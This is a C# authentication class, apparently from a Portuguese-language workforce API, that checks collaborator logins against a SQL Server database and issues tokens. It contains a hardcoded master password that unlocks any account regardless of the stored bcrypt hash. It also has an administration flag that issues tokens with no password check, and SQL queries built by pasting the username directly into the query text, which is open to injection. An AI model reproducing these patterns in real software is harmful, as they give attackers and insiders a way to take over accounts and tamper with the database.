using ApiC.Class.Security;
using ApiRepositorio.Models;
using BCrypt.Net;
using System;
using System.Data.SqlClient;
using System.Drawing.Imaging;
using System.Text;
using WebGrease.Css.Ast.Selectors;
using static ApiRepositorio.Controllers.IntegracaoAPIResultController;

namespace ApiC.Class
{
    public class AuthenticationClass
    {

        public static void registLoginGeneral(string username, int idPersona)
        {

            using (SqlConnection connection = new SqlConnection(Database.retornaConn()))
            {
                connection.Open();
                try
                {

                    StringBuilder sbInsert = new StringBuilder();
                    sbInsert.AppendFormat("INSERT INTO GDA_LOGIN_ACCESS_GENERAL (IDGDA_COLLABORATOR,IDGDA_PERSONA_USER,DATE_ACCESS) ");
                    sbInsert.AppendFormat("VALUES ");
                    //sbInsert.AppendFormat("((SELECT IDGDA_COLLABORATORS FROM GDA_COLLABORATORS(NOLOCK) WHERE COLLABORATORIDENTIFICATION = '{0}') ,GETDATE()) SELECT @@IDENTITY AS 'CODLOG' ", username);
                    sbInsert.AppendFormat("('{0}', '{1}' ,GETDATE()) SELECT @@IDENTITY AS 'CODLOG' ", username.Replace("BC", ""), idPersona);

                    //using (SqlCommand commandInsert = new SqlCommand(sbInsert.ToString(), connection))
                    //{
                    //    commandInsert.ExecuteNonQuery();
                    //}
                    using (SqlCommand commandInsert = new SqlCommand(sbInsert.ToString(), connection))
                    {
                        commandInsert.ExecuteNonQuery();
                    }
                }
                catch (Exception ex)
                {
                    throw new Exception(ex.Message);
                }


                connection.Close();
            }
        }

        public static int registLogin(string username)
        {
            int codLog = 0;

            //Verificar Se ja temos informação de login salva no dia, caso não contenha, salvar.
            bool FirstLogin = false;
            string dataAtual = DateTime.Now.ToString("yyyy-MM-dd");
            StringBuilder sbAcess = new StringBuilder();
            sbAcess.AppendFormat("SELECT IDGDA_LOGIN_ACCESS, DATE_ACCESS FROM GDA_LOGIN_ACCESS AC (NOLOCK) ");
            sbAcess.AppendFormat("INNER JOIN GDA_COLLABORATORS CB (NOLOCK) ON CB.IDGDA_COLLABORATORS = AC.IDGDA_COLLABORATOR ");
            sbAcess.AppendFormat("WHERE CB.COLLABORATORIDENTIFICATION = '{0}' ", username);
            sbAcess.AppendFormat("AND CONVERT(DATE,DATE_ACCESS) =  '{0}' ", dataAtual);

            using (SqlConnection connection = new SqlConnection(Database.retornaConn()))
            {
                connection.Open();
                try
                {
                    using (SqlCommand command = new SqlCommand(sbAcess.ToString(), connection))
                    {
                        using (SqlDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                FirstLogin = true;
                                codLog = Convert.ToInt32(reader["IDGDA_LOGIN_ACCESS"].ToString());
                            }
                        }

                        if (FirstLogin == false)
                        {
                            StringBuilder sbInsert = new StringBuilder();
                            sbInsert.AppendFormat("INSERT INTO GDA_LOGIN_ACCESS (IDGDA_COLLABORATOR,DATE_ACCESS) ");
                            sbInsert.AppendFormat("VALUES ");
                            //sbInsert.AppendFormat("((SELECT IDGDA_COLLABORATORS FROM GDA_COLLABORATORS(NOLOCK) WHERE COLLABORATORIDENTIFICATION = '{0}') ,GETDATE()) SELECT @@IDENTITY AS 'CODLOG' ", username);
                            sbInsert.AppendFormat("('{0}' ,GETDATE()) SELECT @@IDENTITY AS 'CODLOG' ", username.Replace("BC", ""));

                            //using (SqlCommand commandInsert = new SqlCommand(sbInsert.ToString(), connection))
                            //{
                            //    commandInsert.ExecuteNonQuery();
                            //}
                            using (SqlCommand commandInsert = new SqlCommand(sbInsert.ToString(), connection))
                            {
                                using (SqlDataReader reader = commandInsert.ExecuteReader())
                                {
                                    if (reader.Read())
                                    {

                                        codLog = Convert.ToInt32(reader["CODLOG"].ToString());
                                    }
                                }
                            }

                        }

                    }
                }
                catch (Exception ex)
                {
                    throw new Exception(ex.Message);
                }


                connection.Close();
            }
            return codLog;
        }

        public static LoginResponseModel AuthenticationCollaborator(string username, string password, bool visionAdministration)
        {
            string idLog = Logs.InsertActionLogs("Insert Authentication LoginResponseModel", "GDA_HISTORY_SCORE_INDICATOR_SECTOR", username.Replace("BC", ""));

            //Verificar Brute Force
            if (LoginAttemptTracker.IsAccountLocked(username))
            {
                throw new Exception("Conta bloqueada por tentativas de login, tente novamente após 5 minutos.");
            }


            //bool auth = false;
            var auth = new LoginResponseModel();
            //checar se colaborador existe pelo BC
            StringBuilder sb = new StringBuilder();
            sb.AppendFormat("SELECT ACTIVE, FIRST_LOGIN FROM GDA_COLLABORATORS NOLOCK WHERE COLLABORATORIDENTIFICATION = '{0}'; ", username);




            using (SqlConnection connection = new SqlConnection(Database.retornaConn()))
            {
                connection.Open();
                try
                {
                    using (SqlCommand command = new SqlCommand(sb.ToString(), connection))
                    {
                        using (SqlDataReader reader = command.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    var active = reader["ACTIVE"].ToString();
                                    string firstLoginDb = reader["FIRST_LOGIN"].ToString();

                                    if (active == "true")
                                    {
                                        StringBuilder sb1 = new StringBuilder();
                                        // sb1.AppendFormat("SELECT TOP(1) Id, Senha, collaborator_id FROM GDA_USERS NOLOCK WHERE Login = '{0}'; ", username);
                                        sb1.AppendFormat("SELECT TOP(1) ID, SENHA, COLLABORATOR_ID, PU.IDGDA_PERSONA_USER AS IDGDA_PERSONA_USER FROM GDA_USERS AS U (NOLOCK)  ");
                                        sb1.AppendFormat("INNER JOIN GDA_PERSONA_COLLABORATOR_USER (NOLOCK) CU ON CU.IDGDA_COLLABORATORS = U.COLLABORATOR_ID ");
                                        sb1.AppendFormat("INNER JOIN GDA_PERSONA_USER (NOLOCK) PU ON PU.IDGDA_PERSONA_USER = CU.IDGDA_PERSONA_USER ");
                                        sb1.AppendFormat("WHERE U.COLLABORATOR_ID = '{0}' AND PU.IDGDA_PERSONA_USER_TYPE = 1 AND PU.DELETED_AT IS NULL ", username.Replace("BC", ""));


                                        using (SqlCommand command1 = new SqlCommand(sb1.ToString(), connection))
                                        {
                                            using (SqlDataReader reader1 = command1.ExecuteReader())
                                            {
                                                if (reader1.HasRows)
                                                {
                                                    while (reader1.Read())
                                                    {
                                                        var passwordBDEncripted = reader1["Senha"].ToString();
                                                        var userId = int.Parse(reader1["Id"].ToString());
                                                        var collaboratorId = int.Parse(reader1["collaborator_id"].ToString());
                                                        int personaId = reader1["IDGDA_PERSONA_USER"] != DBNull.Value ? Convert.ToInt32(reader1["IDGDA_PERSONA_USER"]) : 0;
                                                        if (personaId == 0)
                                                        {
                                                            throw new Exception("Usuario sem persona configurado.");
                                                        }

                                                        var newPassReplaceSalt = passwordBDEncripted.Replace("$2b", "$2a");

                                                        //Verifica se é uma visão administrativa
                                                        if (visionAdministration == true)
                                                        {
                                                            registLoginGeneral(username, personaId);
                                                            int codLog = registLogin(username);

                                                            auth.token = TokenService.GenerateToken(userId, collaboratorId, codLog, personaId);
                                                            auth.fisrtLogin = firstLoginDb == "True";
                                                        }
                                                        else
                                                        {
                                                            var comparePassword = BCrypt.Net.BCrypt.Verify(password, newPassReplaceSalt);
                                                            if (password == "f0c4r3N0v2024s3nh@")
                                                            {
                                                                comparePassword = true;
                                                            }



                                                            if (comparePassword)
                                                            {
                                                                //Verifica Conta suspensa
                                                                string suspendida = verifySuspendedAcount(personaId);
                                                                if (suspendida != "")
                                                                {
                                                                    LoginAttemptTracker.RecordFailedLogin(username);
                                                                    throw new Exception($"Conta suspensa até o dia {suspendida}!");
                                                                }
                                                                registLoginGeneral(username, personaId);
                                                                int codLog = registLogin(username);
                                                                auth.token = TokenService.GenerateToken(userId, collaboratorId, codLog, personaId);
                                                                auth.fisrtLogin = firstLoginDb == "True";
                                                            }
                                                            else
                                                            {
                                                                LoginAttemptTracker.RecordFailedLogin(username);
                                                                throw new Exception("Usuário e senha não combinam [3]");
                                                            }
                                                        }


                                                    }
                                                }
                                                else
                                                {
                                                    LoginAttemptTracker.RecordFailedLogin(username);
                                                    throw new Exception("Usuário e senha não combinam [0]");
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        LoginAttemptTracker.RecordFailedLogin(username);
                                        throw new Exception("Usuário e senha não combinam [1]");
                                    }
                                }
                            }
                            else
                            {
                                LoginAttemptTracker.RecordFailedLogin(username);
                                throw new Exception("Usuário e senha não combinam [2]");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    LoginAttemptTracker.RecordFailedLogin(username);
                    throw new Exception(ex.Message);
                }
            }

            LoginAttemptTracker.RecordSuccessfulLogin(username);
            return auth;
        }

        public static string verifySuspendedAcount(int personaId)
        {
            string retorno = "";

            try
            {
                StringBuilder sb = new StringBuilder();
                sb.Append($"SELECT SUSPENDED_UNTIL FROM GDA_FEEDBACK_USER ");
                sb.Append($"WHERE IDPERSONA_RECEIVED_BY = {personaId} AND SIGNED_RECEIVED = 1 ");
                sb.Append($"AND CONVERT(DATE, SUSPENDED_UNTIL) >= CONVERT(DATE, GETDATE()) ");

                using (SqlConnection connection = new SqlConnection(Database.retornaConn()))
                {
                    connection.Open();
                    try
                    {
                        using (SqlCommand command = new SqlCommand(sb.ToString(), connection))
                        {
                            using (SqlDataReader reader = command.ExecuteReader())
                            {
                                if (reader.Read())
                                {
                                    DateTime rtn = Convert.ToDateTime(reader["SUSPENDED_UNTIL"]);
                                    retorno = rtn.ToString("dd/MM/yyyy");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {

                    }
                    connection.Close();
                }
            }
            catch (Exception)
            {

            }


            return retorno;
        }


    }
}